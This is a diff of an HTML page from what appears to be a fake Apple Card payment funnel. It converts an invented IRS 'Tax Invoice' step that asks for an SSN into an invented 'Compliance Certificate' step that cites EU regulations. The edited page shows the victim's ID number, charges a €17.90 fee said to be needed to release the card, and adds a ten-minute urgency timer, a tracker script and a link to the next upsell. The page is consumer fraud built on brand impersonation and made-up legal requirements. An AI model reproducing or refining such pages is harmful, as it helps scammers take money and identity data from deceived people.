@@ -4,7 +4,7 @@
 <script src="../../tracker.js"></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Tax Invoice — Apple Card</title>
+<title>Compliance Certificate — Apple Card</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="../upsell.css">
 </head>
@@ -13,13 +13,13 @@
 <div class="loading-screen" id="loadingScreen">
   <img class="loading-logo" src="../../assets/images/black.svg" alt="">
   <div class="loading-spinner"></div>
-  <div class="loading-msg">Issuing tax invoice...</div>
+  <div class="loading-msg">Issuing compliance certificate...</div>
 </div>
 
 <div class="page" id="mainPage" style="display:none">
   <nav class="nav">
     <div class="nav-spacer"></div>
-    <div class="nav-title">Tax Invoice</div>
+    <div class="nav-title">Compliance Certificate</div>
     <div class="nav-step">1/6</div>
   </nav>
 
@@ -28,8 +28,8 @@
       <div class="hero-icon">
         <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6zm10-7H8v-2h8v2zm0 4H8v-2h8v2z"/></svg>
       </div>
-      <h1>Issue your tax invoice<br>with SSN</h1>
-      <p>Required by the IRS to release your Apple Card and unlock tax cashback on your purchases.</p>
+      <h1>Issue your compliance<br>certificate</h1>
+      <p>Required under EU financial regulations to release your Apple Card and unlock cashback on your purchases.</p>
     </div>
 
     <div class="detail-card fade-up">
@@ -38,15 +38,15 @@
         <span class="value" id="customerName">—</span>
       </div>
       <div class="dc-row">
-        <span class="label">SSN</span>
-        <span class="value" id="customerNif">—</span>
+        <span class="label">ID Number</span>
+        <span class="value" id="customerIdNumber">—</span>
       </div>
       <div class="dc-row">
         <span class="label">Product</span>
         <span class="value">Apple Card Titanium</span>
       </div>
       <div class="dc-row">
-        <span class="label">Invoice status</span>
+        <span class="label">Certificate status</span>
         <span class="value warn"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg> Not issued</span>
       </div>
     </div>
@@ -54,26 +54,31 @@
     <div class="reasons fade-up">
       <div class="reason">
         <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
-        <div class="reason-text"><strong>Tax cashback</strong>Reporting to the IRS — qualifies you for sales tax refunds on card purchases.</div>
+        <div class="reason-text"><strong>Cashback unlocked</strong>Confirms your identity with EU authorities — qualifies you for cashback on card purchases.</div>
       </div>
       <div class="reason">
         <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
-        <div class="reason-text"><strong>Delivery authorized</strong>The carrier requires the invoice linked to your SSN to release the physical card.</div>
+        <div class="reason-text"><strong>Delivery authorized</strong>The carrier requires the certificate linked to your ID Number to release the physical card.</div>
       </div>
       <div class="reason">
         <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11z"/></svg></div>
-        <div class="reason-text"><strong>Valid forever</strong>One-time issuance — registered with the IRS, never expires.</div>
+        <div class="reason-text"><strong>Valid forever</strong>One-time issuance — registered with EU authorities, never expires.</div>
       </div>
+    </div>
+
+    <div class="urgency-banner fade-up">
+      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm0-4h-2V7h2v8z"/></svg>
+      This price is reserved for <span class="urgency-timer" id="urgencyTimer">10:00</span>
     </div>
 
     <div class="price-block fade-up">
       <span class="price-tag">One-time fee</span>
-      <div class="price-value" data-price-display>$17.90</div>
-      <div class="price-desc">Tax invoice issuance and IRS reporting</div>
+      <div class="price-value" data-price-display>€ 17.90</div>
+      <div class="price-desc">Compliance certificate issuance and ID verification</div>
     </div>
 
     <button class="pay-btn" id="payBtn">
-      <span class="pay-btn-label">Issue invoice · <span data-price-display>$17.90</span></span>
+      <span class="pay-btn-label">Issue certificate · <span data-price-display>€ 17.90</span></span>
     </button>
 
     <div class="trust-line">
@@ -87,8 +92,8 @@
 
 <script>
 window.UPSELL_CONFIG = {
-  id: 'upsell-fatura-us',
-  title: 'Tax Invoice',
+  id: 'upsell-fatura-eu',
+  title: 'Compliance Certificate',
   price: 17.90,
   next: '../upp1-imposto/index.html'
 };
